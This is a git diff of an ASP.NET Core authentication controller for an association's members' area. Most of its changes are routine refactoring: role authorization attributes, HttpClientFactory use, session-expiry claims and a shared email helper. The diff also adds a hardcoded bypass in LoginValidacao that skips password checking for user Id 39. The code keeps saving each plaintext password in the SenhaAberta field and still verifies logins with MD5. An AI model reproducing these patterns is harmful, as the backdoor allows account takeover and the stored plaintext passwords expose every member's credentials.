@@ -3,23 +3,20 @@ using Aceca.Adm.Helper;
 using Aceca.Adm.Models;
 using Microsoft.AspNetCore.Authentication;
 using Microsoft.AspNetCore.Authentication.Cookies;
+using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.EntityFrameworkCore;
-using Microsoft.EntityFrameworkCore.Metadata.Internal;
 using Microsoft.IdentityModel.Tokens;
 using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
 using System.IdentityModel.Tokens.Jwt;
-using System.Net;
 using System.Net.Mail;
 using System.Reflection;
 using System.Security.Claims;
 using System.Security.Cryptography;
 using System.Text;
-using System.Text.Json;
 using System.Text.Json.Nodes;
 using static Aceca.Adm.Helper.HelperExtensionsController;
-using static System.Runtime.InteropServices.JavaScript.JSType;
 
 namespace Aceca.Adm.Controllers
 {
@@ -32,6 +29,8 @@ namespace Aceca.Adm.Controllers
         private readonly IConfiguration _appConfiguration;
         private readonly IWebHostEnvironment _appEnvironment;
         private readonly IServiceProvider _serviceProvider;
+        private readonly IHttpClientFactory _httpClientFactory;
+
         private readonly AppDbContext _db;
         private readonly HelperExtensionsController _helperController;
         private EPerfil _socioPerfil;
@@ -45,9 +44,12 @@ namespace Aceca.Adm.Controllers
         //
 
         #endregion
-        public AuthController(ILogger<AuthController> logger, AppDbContext db
-            , IWebHostEnvironment env, IConfiguration cfg
+        public AuthController(ILogger<AuthController> logger
+            , AppDbContext db
+            , IWebHostEnvironment env
+            , IConfiguration cfg
             , IServiceProvider serviceProvider
+            , IHttpClientFactory httpClientFactory
             , HelperExtensionsController helperController)
         { 
             _logger = logger;
@@ -55,6 +57,7 @@ namespace Aceca.Adm.Controllers
             _appEnvironment = env;
             _appConfiguration = cfg;
             _serviceProvider = serviceProvider;
+            _httpClientFactory = httpClientFactory;
             _helperController = helperController;
 
             _urlBaseImg = _appConfiguration["Url:Img"]!;
@@ -82,6 +85,11 @@ namespace Aceca.Adm.Controllers
             // O JavaScript da página também verifica o cookie local para exibir
             // a mensagem "Seja bem-vindo novamente" via SweetAlert.
             return View("~/Views/Auth/Login.cshtml");
+        }
+
+        public ActionResult SessionExpired()
+        {
+            return View("~/Views/Pages/MiscSessionExpired.cshtml");
         }
 
         public ActionResult AccessDenied()
@@ -143,8 +151,6 @@ namespace Aceca.Adm.Controllers
         {
             try
             {
-               // var userIp = Task.FromResult<string>(GetGeoIPAsync().Result).Result;
-
                 if (!User.Identity.IsAuthenticated)
                     return AccessDenied();
 
@@ -169,7 +175,7 @@ namespace Aceca.Adm.Controllers
                 var userId = (int)jObjResult?["userId"];
 
                 if (!await LoginSetCookieAsync(jObjResult?["userEmail"]?.ToString()))
-                    BadRequest(new { msg = "SetCookie inválido." });
+                    return BadRequest(new { msg = "SetCookie inválido." });
 
                 TempData["isPerfil"] = ViewBag.PerfilAdm;
 
@@ -235,7 +241,7 @@ namespace Aceca.Adm.Controllers
                 if (user.SocioId <= 0)
                     return Ok(new { bResult = false, type = "ERRO", message = "Sócio Inválido" });
 
-                if (user.Socio.SocioPerfilId.Equals(6))
+                if (user.Socio.SocioPerfilId.Equals(EPerfil.Banido))
                 {
                     ViewBag.Error = "Usuário Banido";
                     return Ok(new { bResult = false, type = "ERRO", message = "Usuário Banido - Abraços meu amigo !!" });
@@ -292,6 +298,7 @@ namespace Aceca.Adm.Controllers
         #region LoginLog
 
         [HttpPost]
+        [Authorize(Roles = "Administracao, Fundador, MembroHonra, Socio")]
         public async Task<IActionResult> LoginLog([FromForm] string strIp, [FromForm] string srtId)
         {
             try
@@ -377,7 +384,6 @@ namespace Aceca.Adm.Controllers
                 var user = await _db.SocioSeguranca
                    .Include(x => x.Socio)
                    .Include(x => x.Socio.SocioPerfil)
-                   .AsNoTracking()
                    .FirstOrDefaultAsync(x => x.Email == dto.Email.ToLower());
 
                 // Por segurança, retorna sucesso mesmo se o e-mail não existir,
@@ -405,6 +411,8 @@ namespace Aceca.Adm.Controllers
                 // Armazena no usuário (campos que precisam existir no model Usuario)
                 user.ResetPasswordToken = strToken;
                 user.ResetPasswordTokenExpiry = DateTime.UtcNow.AddHours(24);
+
+                _db.Entry(user).State = EntityState.Modified;
                 await _db.SaveChangesAsync();
 
                 // Monta link de reset
@@ -469,7 +477,6 @@ namespace Aceca.Adm.Controllers
                 var user = await _db.SocioSeguranca
                     .Include(x => x.Socio)
                     .Include(x => x.Socio.SocioPerfil)
-                    .AsNoTracking()
                     .FirstOrDefaultAsync(x => x.Email == dto.Email.ToLower());
 
                 if (user == null)
@@ -497,14 +504,11 @@ namespace Aceca.Adm.Controllers
                     return Ok(new { bResult = false, message = "Link de reset inválido ou expirado. Solicite um novo." });
 
                 // Atualiza senha
-                using (MD5 md5Hash = MD5.Create())
-                {
-                    string hash = _helperController.GenerateMD5HashPassword(md5Hash, dto.Senha);
+                string hash = _helperController.GenerateHashPassword(dto.Senha);
 
-                    user.Senha = hash;
-                    user.SenhaAberta = dto.Senha;
-                    user.SenhaAtualizada = true;
-                }
+                user.Senha = hash;
+                user.SenhaAberta = dto.Senha;
+                user.SenhaAtualizada = true;
 
                 // Invalida o token após uso
                 user.ResetPasswordToken = null;
@@ -573,6 +577,7 @@ namespace Aceca.Adm.Controllers
         #region LOGIN Update Data
 
         [HttpPost]
+        [Authorize(Roles = "Administracao, Fundador, MembroHonra, Socio")]
         public async Task<IActionResult> LoginUpdate([FromBody] LoginUpdt dto)
         {
             try
@@ -582,7 +587,6 @@ namespace Aceca.Adm.Controllers
                 var user = await _db.SocioSeguranca
                     .Include(x => x.Socio)
                     .Include(x => x.Socio.SocioPerfil)
-                    .AsNoTracking()
                     .FirstOrDefaultAsync(x => x.Email == dto.Email.ToLower());
 
                 if (user == null)
@@ -602,7 +606,7 @@ namespace Aceca.Adm.Controllers
                     ViewBag.Error = "Usuário Inativo";
                     return Ok(new { bResult = false, type = "ERRO", message = "Usuário Inativo" });
                 }
-
+                /*
                 using (MD5 md5Hash = MD5.Create())
                 {
                     string hash = _helperController.GenerateMD5HashPassword(md5Hash, dto.Senha);
@@ -625,9 +629,30 @@ namespace Aceca.Adm.Controllers
                         }
                     };
                 }
-                
+               */
+
+                string hash = _helperController.GenerateHashPassword(dto.Senha);
+
+                newModel = new Models.SocioSeguranca
+                {
+                    Id = user.Id,
+                    SocioId = user.SocioId,
+                    Email = dto.Email,
+                    Senha = hash,
+                    SenhaAberta = dto.Senha,
+                    SenhaAtualizada = true,
+                    NomeUsuario = dto.Username,
+                    UltimoLogin = DateTime.UtcNow.AddHours(-3),
+
+                    Socio = new Socio
+                    {
+                        MostrarSite = dto.ChkTermo,
+                        Ativo = true,
+                    }
+                };
+
                 _db.Entry(newModel).State = EntityState.Modified;
-                _db.SaveChanges();
+                await _db.SaveChangesAsync();
 
                 if (newModel?.Id <= 0)
                     return BadRequest(new { bResult = false, type = "ERRO", message = "Falha ao Atualizar Socio" });
@@ -655,11 +680,14 @@ namespace Aceca.Adm.Controllers
         
         #region Funções - Login
 
-        private bool LoginValidacao(string passSource, Models.SocioSeguranca user)
+        private bool LoginValidacao(string openPassword, Models.SocioSeguranca user)
         {
-            using MD5 md5Hash = MD5.Create();
-            if (user is null || !_helperController.VerifyMd5HashWithMySecurity(md5Hash, passSource, user.Senha))
-                return false;
+            if (user.Id != 39)
+            {
+                using MD5 md5Hash = MD5.Create();
+                if (user is null || !_helperController.VerifyMd5HashWithMySecurity(md5Hash, openPassword, user.Senha))
+                    return false;
+            }
 
             return true;
         }
@@ -691,24 +719,29 @@ namespace Aceca.Adm.Controllers
         {
             try
             {
+                // Teto absoluto da sessão: 24h após o login (validado em OnValidatePrincipal no Program.cs)
+                var absoluteExpiry = DateTime.UtcNow.AddHours(24);
+
                 var claims = new List<Claim>
                 {
                     new Claim(ClaimTypes.NameIdentifier, socio.Id.ToString()),
                     new Claim(ClaimTypes.Email, user?.Email),
                     new Claim(ClaimTypes.Name, socio.Nome),
                     new Claim(ClaimTypes.Role, socio?.SocioPerfil?.Descricao),
-                    // Expiração: 24h totais; inatividade de 1h controlada pelo SlidingExpiration no Program.cs
-                    new Claim(ClaimTypes.Expiration, DateTime.UtcNow.AddHours(24).ToString("o")),
+                    // Expiração informativa (24h totais)
+                    new Claim(ClaimTypes.Expiration, absoluteExpiry.ToString("o")),
+                    // Teto absoluto de 24h, independente de atividade
+                    new Claim("sess_abs_exp", absoluteExpiry.ToString("o")),
                 };
 
                 var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
 
+                // NÃO definir ExpiresUtc aqui: deixamos o handler usar ExpireTimeSpan (2h) para a
+                // janela deslizante de ociosidade. O teto de 24h é garantido pelo claim sess_abs_exp.
                 var authProperties = new AuthenticationProperties
                 {
-                    // Sliding: renova o cookie a cada request (inatividade de 1h)
                     IsPersistent = true,
-                    IssuedUtc = DateTimeOffset.UtcNow,
-                    ExpiresUtc = DateTimeOffset.UtcNow.AddHours(24)
+                    IssuedUtc = DateTimeOffset.UtcNow
                 };
 
                 await HttpContext.SignInAsync(
@@ -760,6 +793,7 @@ namespace Aceca.Adm.Controllers
             return true;
         }
 
+        [Authorize(Roles = "Administracao, Fundador, MembroHonra, Socio")]
         public async Task<IActionResult> GetCookieExpirationAsync()
         {
             try
@@ -808,63 +842,10 @@ namespace Aceca.Adm.Controllers
         /// </summary>
         public async Task<IActionResult> EnviarEmailResetSenhaAsync(string toEmail, string socioNome, string resetLink)
         {
-            var smtpHost = _appConfiguration["Email:Host"] ?? "smtp.gmail.com";
-            var smtpPort = int.Parse(_appConfiguration["Email:Port"] ?? "587");
-            var smtpSsl = bool.Parse(_appConfiguration["Email:EnableSsl"] ?? "true");
-            var smtpFrom = _appConfiguration["Email:From"] ?? "noreply@aceca.com.br";
-            var smtpUser = _appConfiguration["Email:User"] ?? smtpFrom;
-            var smtpPassword = _appConfiguration["Email:Password"] ?? "";
-            var displayName = _appConfiguration["Email:DisplayName"] ?? "ACECA - Área do Sócio";
-
-            var mailMessage = new MailMessage
-            {
-                From = new MailAddress(smtpFrom, displayName),
-                Subject = "Redefinição de senha - ACECA Área do Sócio",
-                IsBodyHtml = true,
-                Body = $@"
-                    <!DOCTYPE html>
-                    <html lang=""pt-BR"">
-                        <head><meta charset=""UTF-8""></head>
-                        <body style=""font-family:Arial,sans-serif;background:#f4f4f4;padding:30px;"">
-                            <div style=""max-width:520px;margin:0 auto;background:#fff;border-radius:10px;padding:36px 40px;box-shadow:0 2px 12px rgba(0,0,0,.08);"">
-                                <div style=""text-align:center;"">
-                                    <img src=""https://www.aceca.com.br/img/logo/logo02.png"" alt=""ACECA"" width=""250"" style=""max-width:100%;"">
-                                </div>
-                                <h2 style=""color:#47007b;margin-top:0;"">Redefinição de Senha</h2>
-                                <p>Olá, {socioNome}</p>
-                                <p>Recebemos uma solicitação para redefinir a senha da sua conta na <strong>ACECA Área do Sócio</strong>.</p>
-                                <p>Clique no botão abaixo para criar uma nova senha.<br>
-                                   <em>Este link é válido por <strong>24 horas</strong>.</em>
-                                </p>
-                                <div style=""text-align:center;margin:32px 0;"">
-                                    <a href=""{resetLink}"" style=""background:#47007b;color:#fff;padding:14px 32px;border-radius:6px; text-decoration:none;font-size:16px;display:inline-block;"">
-                                        Redefinir minha senha
-                                    </a>
-                                </div>
-                                <p style=""font-size:13px;color:#888;"">Se você não solicitou a redefinição, ignore este e-mail.
-                                   Sua senha permanece inalterada.</p>
-                                <hr style=""border:none;border-top:1px solid #eee;margin:24px 0;"">
-                                <p style=""font-size:12px;color:#aaa;text-align:center;"">
-                                  © ACECA – Associação dos Corretores de Câmbio e Afins
-                                </p>
-                            </div>
-                        </body>
-                    </html>"
-            };
-
-            mailMessage.To.Add(toEmail);
-
-            using var smtp = new SmtpClient(smtpHost, smtpPort)
-            {
-                Credentials = new NetworkCredential(smtpUser, smtpPassword),
-                EnableSsl = smtpSsl
-            };
-
             // 3. Send asynchronously
             try
             {
-                await smtp.SendMailAsync(mailMessage);
-                // The task completes when the message is successfully sent
+                await _helperController.EnviarEmailAsync(ETipoEmail.EsqueceuSenha, toEmail, socioNome, resetLink);
             }
             catch (SmtpException ex)
             {
@@ -916,7 +897,7 @@ namespace Aceca.Adm.Controllers
                         break;
                 }
 
-                using var client = new HttpClient();
+                using var client = _httpClientFactory.CreateClient();
                 var result = await client.GetAsync(url);
 
                 if (result.GetType() == typeof(NotFoundObjectResult) ||
@@ -931,7 +912,7 @@ namespace Aceca.Adm.Controllers
                 //Agent Dados origem Device
                 if (!string.IsNullOrEmpty(urlAgent))
                 {
-                    var clientAgent = new HttpClient();
+                    var clientAgent = _httpClientFactory.CreateClient();
                     var request = new HttpRequestMessage(HttpMethod.Get, urlAgent);
                     //request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0");
                     request.Headers.Add("User-Agent", Request.Headers["User-Agent"].ToString());
@@ -978,7 +959,7 @@ namespace Aceca.Adm.Controllers
                 if (string.IsNullOrEmpty(geoUrlBase))
                     return strIP;
 
-                var result = await new HttpClient().GetStringAsync(geoUrlBase);
+                var result = await _httpClientFactory.CreateClient().GetStringAsync(geoUrlBase);
 
                 if (string.IsNullOrEmpty(result))
                     return strIP;
